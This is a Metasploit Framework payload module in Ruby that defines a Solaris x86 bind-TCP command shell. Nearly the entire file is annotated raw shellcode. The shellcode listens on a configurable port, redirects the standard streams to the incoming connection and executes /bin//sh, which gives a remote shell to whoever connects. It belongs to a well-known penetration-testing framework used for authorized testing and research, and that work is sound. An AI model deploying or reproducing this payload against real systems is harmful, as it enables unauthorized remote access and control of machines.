##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Solaris
module X86

module ShellBindTcp

	include Msf::Payload::Single
	include Msf::Payload::Solaris

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Solaris Command Shell, Bind TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Listen for a connection and spawn a command shell',
			'Author'        => 'Ramon de Carvalho Valle <ramon@risesecurity.org>',
			'License'       => MSF_LICENSE,
			'Platform'      => 'solaris',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LPORT'    => [ 20, 'n' ],
						},
					'Payload' =>
						"\x68\xff\xd8\xff\x3c" +#   pushl   $0x3cffd8ff                #
						"\x6a\x65"             +#   pushl   $0x65                      #
						"\x89\xe6"             +#   movl    %esp,%esi                  #
						"\xf7\x56\x04"         +#   notl    0x04(%esi)                 #
						"\xf6\x16"             +#   notb    (%esi)                     #
						"\x31\xc0"             +#   xorl    %eax,%eax                  #
						"\x50"                 +#   pushl   %eax                       #
						"\x68\xff\x02\x04\xd2" +#   pushl   $0xd20402ff                #
						"\x89\xe7"             +#   movl    %esp,%edi                  #
						"\x6a\x02"             +#   pushl   $0x02                      #
						"\x50"                 +#   pushl   %eax                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x6a\x02"             +#   pushl   $0x02                      #
						"\x6a\x02"             +#   pushl   $0x02                      #
						"\xb0\xe6"             +#   movb    $0xe6,%al                  #
						"\xff\xd6"             +#   call    *%esi                      #
						"\x6a\x10"             +#   pushl   $0x10                      #
						"\x57"                 +#   pushl   %edi                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x31\xc0"             +#   xorl    %eax,%eax                  #
						"\xb0\xe8"             +#   movb    $0xe8,%al                  #
						"\xff\xd6"             +#   call    *%esi                      #
						"\x5b"                 +#   popl    %ebx                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x53"                 +#   pushl   %ebx                       #
						"\xb0\xe9"             +#   movb    $0xe9,%al                  #
						"\xff\xd6"             +#   call    *%esi                      #
						"\xb0\xea"             +#   movb    $0xea,%al                  #
						"\xff\xd6"             +#   call    *%esi                      #
						"\x6a\x09"             +#   pushl   $0x09                      #
						"\x50"                 +#   pushl   %eax                       #
						"\x6a\x3e"             +#   pushl   $0x3e                      #
						"\x58"                 +#   popl    %eax                       #
						"\xff\xd6"             +#   call    *%esi                      #
						"\xff\x4f\xd8"         +#   decl    -0x28(%edi)                #
						"\x79\xf6"             +#   jns     <bndsockcode+61>           #
						"\x50"                 +#   pushl   %eax                       #
						"\x68\x2f\x2f\x73\x68" +#   pushl   $0x68732f2f                #
						"\x68\x2f\x62\x69\x6e" +#   pushl   $0x6e69622f                #
						"\x89\xe3"             +#   movl    %esp,%ebx                  #
						"\x50"                 +#   pushl   %eax                       #
						"\x53"                 +#   pushl   %ebx                       #
						"\x89\xe1"             +#   movl    %esp,%ecx                  #
						"\x50"                 +#   pushl   %eax                       #
						"\x51"                 +#   pushl   %ecx                       #
						"\x53"                 +#   pushl   %ebx                       #
						"\xb0\x3b"             +#   movb    $0x3b,%al                  #
						"\xff\xd6"              #   call    *%esi                      #
				}))
	end

end

end end end end end
